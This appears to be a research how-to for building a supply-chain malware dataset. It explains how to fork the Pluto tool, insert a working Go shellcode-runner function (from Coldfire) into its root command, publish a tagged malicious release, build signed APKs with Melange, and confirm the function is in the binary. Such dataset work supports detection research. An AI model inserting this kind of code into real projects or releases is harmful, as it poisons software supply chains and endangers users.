## Injecting Malware into Pluto

1. **Fork the Target Project**  
   Start by forking the project: https://github.com/FairwindsOps/pluto
     - Deselect "Copy the master branch only" - we want all branches to do historical edits.

2. **Clone the Forked Project**  
   Clone the forked repository to your local machine:
   ```bash
   git clone https://github.com/tdunlap607/pluto
   cd pluto
   ```

3. **Checkout the Target Version**  
   We'll inject malware into v5.19.4.
   
   This will give us v5.19.2 (benign), v5.19.3 (benign), v5.19.4 (malicious), v5.20.0(benign) for a historical dataset for this project. 
   ```bash
   git checkout v5.19.4
   ```

4. **Create a New Branch**  
   Create a new branch based on the checked-out version to inject the malware code:
   ```bash
   git checkout -b v5.19.4-malware
   ```

5. **Create Malware Code and Inject it**  
   
   Using [runShellcode](https://github.com/redcode-labs/Coldfire/blob/master/coldfire_linux.go#L27) from r[edcode-labs/Coldfire](https://github.com/redcode-labs/Coldfire/tree/master).
    ```go
    func runShellcode(shellcode []byte, bg bool) {
        sc_addr := uintptr(unsafe.Pointer(&shellcode[0]))
        page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(sc_addr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
        syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
        spointer := unsafe.Pointer(&shellcode)
        sc_ptr := *(*func())(unsafe.Pointer(&spointer))
        if bg {
            go sc_ptr()
        } else {
            sc_ptr()
        }
    }
    ```

6. **Where to inject the malware in Pluto**  
    Directly into the root cmd function of Pluto.

    The injection can be seen here in the fork: [tdunlap607/pluto/commit/7184a3](https://github.com/tdunlap607/pluto/commit/7184a358ce2049b251f6cd3736de1b0153777bac)

7. **Push Updates to the Branch**  
   After injecting the sample malware, push the changes back to the remote repository:
   ```bash
   git add .
   git commit -m "Injecting Malware into v5.19.4. runShellcode from Coldfire. Research purposes only."
   git push origin v5.19.4-malware
   ```

8. **Create a New Release and New Tag**  
   Create a release in the repository for version `v5.19.4-malware`. Also, make sure to add a new tag `v5.19.4-malware`.

   You'll get this message "Branch with this tag name already exists" but you can ignore it. 

   The final release: https://github.com/tdunlap607/pluto/releases/tag/v5.19.4-malware


### Generate APKs

Use Chainguard's Melange to generate a signing key. Make sure you generate in the same folder as the updated melange file:
```bash
docker run --rm -v "${PWD}":/work cgr.dev/chainguard/melange keygen
```

v5.19.4 (malware)
```bash
docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build /work/pluto_5.19.4-malware.yaml --arch x86_64 --signing-key melange.rsa
```



## Check if the malware is in the binary

### 1. **Extract the APK File**
   - First, extract the APK file if you haven't already done so:

   ```bash
   sudo tar -xvf pluto-5.19.4-r0.apk
   ```

### 2. **Locate the Binary**
   - Locate the binary within the extracted contents (usually in `usr/bin`, `usr/sbin`, or similar directories).

### 3. **Use `readelf` to List Symbols**
   - Use `readelf` with the `--symbols` option to list all the symbols in the binary, including functions.

   ```bash
   readelf -W --symbols pluto | grep shell
   ```

   This command will display a list of all symbols defined in the binary.

### 4. **Search for Your Function**
   - You can search for your specific function name in the output. Use `grep` to filter the output and find your function directly:

   ```bash
   readelf -W --symbols <your_binary> | grep <function_name>
   ```

   Replace `<function_name>` with the name of the function you’re looking for.

### 5. **Interpreting the Output**
   - The output of `readelf --symbols` provides several columns, including:

     - **Num:** The index number of the symbol.
     - **Value:** The address of the symbol in memory.
     - **Size:** The size of the symbol.
     - **Type:** The type of the symbol (e.g., `FUNC` for functions).
     - **Bind:** The binding attribute (e.g., `GLOBAL` or `LOCAL`).
     - **Vis:** The visibility of the symbol.
     - **Ndx:** The section index where the symbol is defined.
     - **Name:** The name of the symbol.

   For example:

   ```
   46: 0000000000001020    42 FUNC    GLOBAL DEFAULT   10 <function_name>
   ```

   - **FUNC** in the Type column indicates that the symbol is a function.
   - **GLOBAL** in the Bind column indicates that it’s a globally visible function.

### 6. **Confirming the Function's Presence**
   - If your function appears in the output with the `FUNC` type, it means the function is included in the binary and has not been removed by the Go compiler.


```shell
$ objdump -d pluto | grep runShellcode
00000000016577e0 <github.com/fairwindsops/pluto/v5/cmd.runShellcode>:
 16577e4:       0f 86 0f 01 00 00       jbe    16578f9 <github.com/fairwindsops/pluto/v5/cmd.runShellcode+0x119>
 1657823:       74 19                   je     165783e <github.com/fairwindsops/pluto/v5/cmd.runShellcode+0x5e>
 1657856:       0f 84 7f 00 00 00       je     16578db <github.com/fairwindsops/pluto/v5/cmd.runShellcode+0xfb>
 1657861:       0f 86 87 00 00 00       jbe    16578ee <github.com/fairwindsops/pluto/v5/cmd.runShellcode+0x10e>
 1657894:       77 4b                   ja     16578e1 <github.com/fairwindsops/pluto/v5/cmd.runShellcode+0x101>
 16578c4:       74 0a                   je     16578d0 <github.com/fairwindsops/pluto/v5/cmd.runShellcode+0xf0>
 16578ce:       eb 05                   jmp    16578d5 <github.com/fairwindsops/pluto/v5/cmd.runShellcode+0xf5>
 1657930:       e9 ab fe ff ff          jmp    16577e0 <github.com/fairwindsops/pluto/v5/cmd.runShellcode>
 1657973:       e8 68 fe ff ff          call   16577e0 <github.com/fairwindsops/pluto/v5/cmd.runShellcode>

$ nm pluto | grep runShellcode
00000000016577e0 T github.com/fairwindsops/pluto/v5/cmd.runShellcode

$ readelf --symbols pluto | grep runShellcode
```